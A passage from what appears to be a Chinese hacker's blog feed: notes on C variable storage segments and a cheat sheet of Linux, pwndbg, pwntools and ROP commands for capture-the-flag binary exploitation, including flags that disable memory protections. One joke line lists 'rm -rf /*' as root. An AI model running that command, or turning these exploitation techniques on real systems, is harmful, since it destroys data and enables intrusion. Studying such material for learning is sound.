&#x27;,0</span><br><span class="line">.rodata:0000000000402047 ; const char aIMInFunc[]</span><br><span class="line">.rodata:0000000000402047 aIMInFunc       db 0Ah                  ; DATA XREF: in+8↑o</span><br><span class="line">.rodata:0000000000402047                 db &#x27; I&#x27;,27h,&#x27;m *in() func :) &#x27;,0</span><br><span class="line">.rodata:0000000000402047 _rodata         ends</span><br><span class="line">.rodata:0000000000402047</span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#text段上有很多其他函数，就不列出了</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在main函数ia = ib下方加一句ia = ic;后bss段变化如下，自己体会</span></span><br></pre></td></tr></table></figure><p>图1：</p><p><img src="image-20220811164044550.png" alt="image-20220811164044550"></p><p>图2：</p><p><img src="image-20220811164028199.png" alt="image-20220811164028199"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#int小结：（个人理解）</span></span><br><span class="line"><span class="comment">#注：全局变量</span></span><br><span class="line">常量a：未赋值、赋值为<span class="number">0</span>时，存储在bss段，赋值后存在data段</span><br><span class="line">数组a[n]：数组未赋值、赋值为<span class="number">0</span>时，存储在bss段，赋值后存在data段</span><br><span class="line">指针 *a ：空指针存在bss段，赋值后存在data段</span><br><span class="line">函数a() ：不管有无定义，函数变量都不在bss段，有定义的函数写在代码段(text段)，无定义的函数无了，*ik</span><br><span class="line">函数指针(* a)()：未赋值存储在bss段，赋值则存在data段</span><br><span class="line"></span><br><span class="line"><span class="comment">#其次，对于函数内部变量，上面的是针对全局变量的</span></span><br><span class="line">运行时存储在栈上</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>图3：</p><p><img src="image-20220811164848543.png" alt="image-20220811164848543"></p>]]></content>
    
    
    <summary type="html">个人见解</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>指令收录集</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/08/%E6%8C%87%E4%BB%A4%E6%94%B6%E5%BD%95%E9%9B%86/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/08/%E6%8C%87%E4%BB%A4%E6%94%B6%E5%BD%95%E9%9B%86/</id>
    <published>2022-08-08T02:24:50.000Z</published>
    <updated>2023-03-05T14:59:42.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="linux终端"><a href="#linux终端" class="headerlink" title="linux终端"></a>linux终端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[文件/目录名]代表可加项，即可不加</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常用  详请百度自行搜索</span></span><br><span class="line">  $ ls    $ ll  ......</span><br><span class="line">  $ <span class="built_in">pwd</span></span><br><span class="line">  $ vim &lt;文件名&gt;</span><br><span class="line">  $ chmod 777 &lt;文件名&gt;</span><br><span class="line">  $ rm -r &lt;目录名&gt;    $ rm &lt;文件名&gt;</span><br><span class="line">  $ <span class="built_in">cd</span> /  $ <span class="built_in">cd</span> ../   $ <span class="built_in">cd</span> &lt;目录名&gt;</span><br><span class="line">  $ cp ./&lt;文件名&gt; &lt;目标路径&gt;/</span><br><span class="line">  $ mv &lt;原文件名&gt; &lt;想要修改成的文件名&gt;</span><br><span class="line">  $ mv &lt;文件/目录名&gt; &lt;想要移动至的目录&gt;/[想要修改成的文件/目录名]</span><br><span class="line">  $ mkdir</span><br><span class="line">  $ cat -n </span><br><span class="line">  $ <span class="built_in">history</span></span><br><span class="line">  $ su root          <span class="comment">#可尝试ctrl+d、ctrl+c、ctrl+z来退出root权限</span></span><br><span class="line">  $ whereis &lt;文件名&gt;</span><br><span class="line">  $ sudo &lt;指令&gt;</span><br><span class="line">  $ sudo apt-get update</span><br><span class="line">  $ apt install &lt;软件包名&gt;</span><br><span class="line">  $ sudo passwd</span><br><span class="line">  $ readelf -a &lt;二进制文件&gt;</span><br><span class="line">  $ <span class="built_in">history</span> | grep proxy</span><br><span class="line">  $ who /var/<span class="built_in">log</span>/wtmp    <span class="comment">#</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#pwn常用</span></span><br><span class="line">  $ gcc stack.c -fno -stack -protector -no -pie -o stack</span><br><span class="line">  $ gcc &lt;文件名&gt;.c -o &lt;二进制文件名&gt;</span><br><span class="line">  $ gcc -g &lt;文件名&gt;.c -o &lt;binary&gt;   <span class="comment">#插入调试信息</span></span><br><span class="line">  $ gcc -m32 &lt;xx.c&gt;  -o &lt;xx&gt;       <span class="comment">#编译成32位二进制文件</span></span><br><span class="line">  $ ldd &lt;二进制文件&gt;       <span class="comment">#查看二进制文件所依赖的动态链接库文件</span></span><br><span class="line">  $ strace ./&lt;二进制文件&gt;  <span class="comment">#查看程序执行时的所有系统调用</span></span><br><span class="line">  $ ltrace ./&lt;二进制文件&gt;  <span class="comment">#查看调用过程中出现的libc函数</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#web</span></span><br><span class="line">  $ netstat -aptn    <span class="comment">#查看本机端口</span></span><br><span class="line">  $ netstat -rn</span><br><span class="line">  $ netstat -pantu | grep 333</span><br><span class="line">  $ base64 </span><br><span class="line">  $ ssh &lt;用户名&gt;@&lt;ip&gt; <span class="comment">#ssh root@167.179.100.60</span></span><br><span class="line">  $ scp &lt;用户名&gt;@&lt;ip地址&gt;:&lt;服务器文件位置的绝对路径&gt; &lt;接收路径&gt;    <span class="comment">#拷贝服务器文件至&lt;接收路径&gt;</span></span><br><span class="line">  $ scp &lt;本地文件&gt; &lt;用户名&gt;@&lt;ip地址&gt;:&lt;服务器接收位置的绝对路径&gt;    <span class="comment">#向服务器发送文件</span></span><br><span class="line">  $ scp ./server_proxy.c root@45.77.47.112:/home/ubuntu/xy666/xy/  </span><br><span class="line">  <span class="comment">#关闭端口</span></span><br><span class="line">    $ netstat -anp | grep &lt;端口&gt;      <span class="comment">#查找想要关闭的端口的守护进程</span></span><br><span class="line">    $ <span class="built_in">kill</span> -9 &lt;PID&gt;                  <span class="comment">#PID为进程号</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#编译时Linux保护机制的开启/关闭</span></span><br><span class="line">  <span class="comment">#参考链接：https://www.jianshu.com/p/91fae054f922</span></span><br><span class="line">  $ -z execstack / -z noexecstack (NX开启/关闭)</span><br><span class="line">  $ -fno-stack-protector /-fstack-protector /-fstack-protector-all (Canary关闭/开启/全开启)</span><br><span class="line">  $ -no-pie / -pie (PIE关闭/开启)</span><br><span class="line">  $ -z norelro /-z lazy /-z now (RELRO关闭/部分开启/完全开启)</span><br><span class="line">  </span><br><span class="line"><span class="comment">#grep</span></span><br><span class="line">  $ ll | grep 1    <span class="comment"># |(管道符)：把前面指令的输出作为后面指令的输入</span></span><br><span class="line">  $ ll &gt; &lt;文件名&gt;   <span class="comment"># &gt;(输出符)，ll指令结果输出到文件中  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#关机重启 </span></span><br><span class="line">  $ reboot   <span class="comment">#重启</span></span><br><span class="line">  $ halt     <span class="comment">#关机</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#进程查看 链接：https://cloud.tencent.com/developer/article/1711858</span></span><br><span class="line">  $ pstree -aup</span><br><span class="line">  $ top</span><br><span class="line">  $ ps -elf</span><br><span class="line">  $ ps -elf</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压文件 链接：https://blog.csdn.net/afei__/article/details/82619843</span></span><br><span class="line">  $ tar -zxvf &lt;文件名&gt;.tar.gz</span><br><span class="line">  $ unzip     &lt;文件名&gt;.zip</span><br><span class="line">  $ 7z x      &lt;文件名&gt;.zip</span><br><span class="line">  $ unrar x   &lt;压缩包名&gt;.rar</span><br><span class="line">  </span><br><span class="line"><span class="comment">#压缩文件</span></span><br><span class="line">  $ tar -zcvf &lt;压缩包名&gt;.tar.gz [文件名] [目录名]</span><br><span class="line">  $ zip -r    &lt;压缩包名&gt;.zip &lt;文件/目录名&gt;</span><br><span class="line">  $ rar a -r  &lt;压缩包名&gt;.rar &lt;文件/目录名&gt;</span><br><span class="line">  </span><br><span class="line"><span class="comment">#设置防火墙</span></span><br><span class="line">  $ firewall-cmd --state <span class="comment">#查询防火墙规则 </span></span><br><span class="line">  $ firewall-cmd --list-port <span class="comment">#查看已开放端口 </span></span><br><span class="line">  $ firewall-cmd --permanent --add-port=443/tcp <span class="comment">#开放443端口 </span></span><br><span class="line">  $ firewall-cmd --reload <span class="comment">#重启防火墙(修改配置后要重启防火墙) </span></span><br><span class="line">  $ firewall-cmd --query-port=443/tcp <span class="comment">#查询端口是否开放 </span></span><br><span class="line">  $ firewall-cmd --permanent --remove-port=443/tcp <span class="comment">#移除端口</span></span><br><span class="line">  </span><br><span class="line">  $ systemctl start firewalld  <span class="comment">#开启防火墙管理工具</span></span><br><span class="line">  $ systemctl stop firewalld   <span class="comment">#关闭firewalld</span></span><br><span class="line">  $ systemctl status firewalld <span class="comment">#查看firewalld状态</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#objdump</span></span><br><span class="line">  $ objdump -dj .plt ret2libc2   <span class="comment">#查看ret2libc2文件的plt表</span></span><br><span class="line">  $ objdump -h &lt;可执行文件&gt;       <span class="comment">#查看所有节，并节选所需内容</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#ROPgadget</span></span><br><span class="line">  $ ROPgadget --binary ret2libc2 --only <span class="string">&quot;pop|ret&quot;</span>  <span class="comment">#查找文件中的pop或ret字段</span></span><br><span class="line">  $ ROPgadget --binary ./chall | grep rdi</span><br><span class="line">  $ one_gadget ../lib/libc.so.6</span><br><span class="line">  </span><br><span class="line"><span class="comment">#pwnable.kr </span></span><br><span class="line">  链接：https://www.jianshu.com/p/55fa36123960</span><br><span class="line">  $ scp -P&lt;端口&gt;  &lt;网站&gt;:&lt;文件&gt; &lt;本地目录&gt;    <span class="comment">#本地输入该指令下载远程服务器文件</span></span><br><span class="line">  $ scp -P2222 passcode@pwnable.kr:passcode ./</span><br><span class="line">  </span><br><span class="line"><span class="comment">#pwn题更换链接的库文件</span></span><br><span class="line"><span class="comment">##首先需要ldd &lt;二进制文件&gt; 查看当前链接的库文件</span></span><br><span class="line">  $ patchelf --replace-needed &lt;当前链接的库文件&gt; &lt;想要更换为的库文件&gt; &lt;二进制文件&gt;</span><br><span class="line">  $ patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn1</span><br><span class="line">  $ patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 ./libc-2.27.so ./unexploitable</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------- .py文件中换ld、libc.so</span></span><br><span class="line">  myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">  mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">  myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">  myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"><span class="comment">#----------- 源自：https://blingblingxuanxuan.github.io/2022/10/17/asis-ctf-2022-pwn/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#proxy 使用proxychains需要一些前期配置，自行百度</span></span><br><span class="line"> $ proxychains &lt;git指令&gt;</span><br><span class="line"> $ proxychains git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"> </span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">  $ whoami     <span class="comment">#这竟然是条指令</span></span><br><span class="line">  <span class="comment"># rm -rf /*  #root用户下，试试就逝世</span></span><br></pre></td></tr></table></figure><br/><br/><h3 id="pwndgb"><a href="#pwndgb" class="headerlink" title="pwndgb"></a>pwndgb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ******************************** ↓ 栈 ↓ ************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#常用的</span></span><br><span class="line">pwndbg&gt; b main      <span class="comment">#break   ，main函数下断点</span></span><br><span class="line">pwndbg&gt; r           <span class="comment">#run     ，运行程序，其会自动在第一个断点处暂停执行</span></span><br><span class="line">pwndbg&gt; ni          <span class="comment">#next    ，单步执行，不进入函数体</span></span><br><span class="line">pwndbg&gt; si          <span class="comment">#step    ，单步执行，进入函数内部</span></span><br><span class="line">pwndbg&gt; p           <span class="comment">#print   ，打印指定变量的值。例：p &amp;buf2，查找buf2的存储地址，</span></span><br><span class="line">pwndbg&gt; i b         <span class="comment">#info break，查看所有断点</span></span><br><span class="line">pwndbg&gt; vmmap       <span class="comment">#查看当前程序的系统调用库，常用来查看可执行段位置</span></span><br><span class="line">pwndbg&gt; cyclic 200  <span class="comment">#按一定的规则生成200个字符串</span></span><br><span class="line">pwndbg&gt; cyclic -l &lt;数据&gt;     <span class="comment"># 查询&lt;数据&gt;在生成的字符串中的位置，&lt;数据&gt;例子：0x62616164</span></span><br><span class="line">pwndbg&gt; b *&lt;地址&gt;            <span class="comment"># 指定地址处下断点，&lt;地址&gt;例子：0x08048648</span></span><br><span class="line">pwndbg&gt; x/130wx &lt;地址&gt;       <span class="comment"># 打印栈上信息，此处&lt;地址&gt;常用esp指向的栈地址</span></span><br><span class="line">pwndbg&gt; i all-registers      <span class="comment"># 查看所有寄存器信息</span></span><br><span class="line">pwndbg&gt; got                  <span class="comment">#查看got表信息</span></span><br><span class="line">pwndbg&gt; elf                  <span class="comment">#查看elf文件信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不常用</span></span><br><span class="line">pwndbg&gt; start       <span class="comment">#在程序第一条汇编指令处下断点</span></span><br><span class="line">pwndbg&gt; bt          <span class="comment">#查看函数调用栈</span></span><br><span class="line">pwndbg&gt; p &lt;函数名&gt;   <span class="comment">#查看函数地址</span></span><br><span class="line">pwndbg&gt; c           <span class="comment">#continue，运行至下一断点</span></span><br><span class="line">pwndbg&gt; d           <span class="comment">#delete  ，通常用来删除所有断点，也可以删除指定编号的各类型断点</span></span><br><span class="line">pwndbg&gt; disass      <span class="comment">#~~emble ，反汇编，disassemble main，disassemble /r main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暂未用到过的</span></span><br><span class="line">pwndbg&gt; l           <span class="comment">#list    ，显示源程序代码的内容，包括各行代码所在的行号。</span></span><br><span class="line">pwndbg&gt; <span class="keyword">fi</span>          <span class="comment">#finish  ，结束当前正在执行的函数，并在跳出函数后暂停程序的执行。</span></span><br><span class="line">pwndbg&gt; j           <span class="comment">#jump    ，使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。</span></span><br><span class="line">pwndbg&gt; q           <span class="comment">#quit    ，终止调试。</span></span><br><span class="line">pwndbg&gt; u           <span class="comment">#until   ，百度去搜</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#高阶用法</span></span><br><span class="line"><span class="comment"># http://c.biancheng.net/view/8238.html</span></span><br><span class="line"><span class="comment"># https://www.cnblogs.com/zuoanfengxi/p/12763350.html</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$eip</span> = 0x8048300    <span class="comment">#设置寄存器eip的值</span></span><br><span class="line">pwndbg&gt; p <span class="variable">$eip</span>                  <span class="comment">#打印</span></span><br><span class="line">pwndbg&gt; x/i <span class="variable">$eip</span>                <span class="comment">#把地址处存的值按照汇编来解析，打印出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ******************************** ↑ 栈 ↑ ************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------  分界线  ------------------------------------------------- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ******************************** ↓ 堆 ↓ ************************************************** #</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; top_chunk             <span class="comment">#打印top chunk初始地址</span></span><br><span class="line">pwndbg&gt; vmmap                 <span class="comment">#不做冗余解释 </span></span><br><span class="line">pwndbg&gt; bin                   <span class="comment">#查看bin表</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; file ./&lt;二进制文件名&gt;   <span class="comment">#导入源代码，方便调试</span></span><br><span class="line">pwndbg&gt; x/250gx &lt;地址&gt;         <span class="comment">#打印堆信息</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># ******************************** ↑ 堆 ↑ ************************************************** #</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context(arch=&quot;i386&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#连接：</span></span><br><span class="line">sh = process(<span class="string">&#x27;本地文件&#x27;</span>)      <span class="comment">#创建本地连接</span></span><br><span class="line">sh = remote(<span class="string">&quot;ip地址&quot;</span>，端口号)  <span class="comment">#远程</span></span><br><span class="line">sh.close()                   <span class="comment">#关闭连接</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> &lt;函数名&gt;(<span class="params">参数<span class="number">1</span>,参数<span class="number">2</span>,...,参数n</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">gdb</span>.<span class="title">attach</span>(<span class="params">io,<span class="string">&#x27;b* 0x08048598 \n c&#x27;</span></span>)  #开启<span class="title">gdb</span>调试，在0<span class="title">x08048598</span>下断点并继续执行</span></span><br><span class="line"><span class="function"><span class="title">sleep</span>(<span class="params"><span class="number">3</span></span>) </span></span><br><span class="line"><span class="function"><span class="title">shellcode</span> = <span class="title">asm</span>(<span class="params"><span class="string">&quot;汇编代码&quot;</span></span>)    #汇编转二进制</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">elf</span> = <span class="title">ELF</span>(<span class="params"><span class="string">&#x27;./&lt;二进制文件名&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">&lt;函数名&gt;<span class="title">_plt</span> = <span class="title">elf</span>.<span class="title">plt</span>[&#x27;&lt;函数名&gt;&#x27;]</span></span><br><span class="line"><span class="function"><span class="title">read_got</span>    = <span class="title">elf</span>.<span class="title">got</span>[&#x27;<span class="title">read</span>&#x27;]</span></span><br><span class="line"><span class="function"><span class="title">main_adr</span>    = <span class="title">elf</span>.<span class="title">symbols</span>[&#x27;<span class="title">_start</span>&#x27;]</span></span><br><span class="line"><span class="function"><span class="title">bss_adr</span>     = <span class="title">elf</span>.<span class="title">bss</span>()</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendlineafter</span>(<span class="params"><span class="string">&#x27;字符串&#x27;</span>,data</span>)#在遇到字符串后发送数据<span class="title">data</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendafter</span>(<span class="params"><span class="string">&#x27;字符串&#x27;</span>,data</span>)    #在遇到字符串后发送数据<span class="title">data</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">interactive</span>()              #直接进行交互，相当于回到<span class="title">shell</span>的模式，在取得<span class="title">shell</span>之后使用</span></span><br></pre></td></tr></table></figure><br/><br/><h3 id="pwntools-ROP模块"><a href="#pwntools-ROP模块" class="headerlink" title="pwntools ROP模块"></a>pwntools ROP模块</h3><p>参考链接：<a href="https://www.jianshu.com/p/0d45e2025d97">简书</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># raw()</span></span><br><span class="line">  rop.raw(<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)    <span class="comment">#--rop中添加10个a字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dump()    </span></span><br><span class="line">  <span class="built_in">print</span> rop.dump()   <span class="comment">#--将已构建的栈数据输出，且方便阅读</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call()    #--使用rop.read(1,2,3):效果和call一样</span></span><br><span class="line">  rop.call(<span class="string">&#x27;read&#x27;</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">  <span class="built_in">print</span> rop.dump()</span><br><span class="line">  <span class="number">0x0000</span>:           <span class="string">&#x27;aaaa&#x27;</span> <span class="string">&#x27;aaaaaaaaaa&#x27;</span></span><br><span class="line">  <span class="number">0x0004</span>:           <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">  <span class="number">0x0008</span>:           <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">  <span class="number">0x000c</span>:        <span class="number">0x80483a0</span> read(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">  <span class="number">0x0010</span>:           <span class="string">&#x27;eaaa&#x27;</span> &lt;<span class="keyword">return</span> address&gt;</span><br><span class="line">  <span class="number">0x0014</span>:              <span class="number">0x1</span> arg0</span><br><span class="line">  <span class="number">0x0018</span>:              <span class="number">0x2</span> arg1</span><br><span class="line">  <span class="number">0x001c</span>:              <span class="number">0x3</span> arg2</span><br><span class="line">  <span class="comment">#--rop模块会自动寻找gadget来连接上2次功能调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unresolve()  #--rop.unresolve(&#x27;main&#x27;) 返回符号的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># migrate()    #--通过栈迁移后控制程序往哪里执行</span></span><br><span class="line">  pop ebp; ret</span><br><span class="line">  如果此处换成其他地址,则栈就被迁移到另外一个地方去了</span><br><span class="line">  https://www.jianshu.com/p/0d45e2025d97</span><br><span class="line"></span><br><span class="line"><span class="comment"># chain()      #--rop.chain(),返回完整的payload</span></span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  $ python3</span><br><span class="line">  $ python</span><br><span class="line">  $ python3 &lt;文件名&gt;.py</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(<span class="number">200</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic_find(<span class="string">&#x27;aaag&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pwn</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(pwn)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">help</span>(pwn.process)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print()   打印</span></span><br><span class="line"><span class="comment"># hex()     将10进制数转换为16进制地址</span></span><br></pre></td></tr></table></figure><br/><br/><h3 id="汇编指令"><a href="#汇编指令" 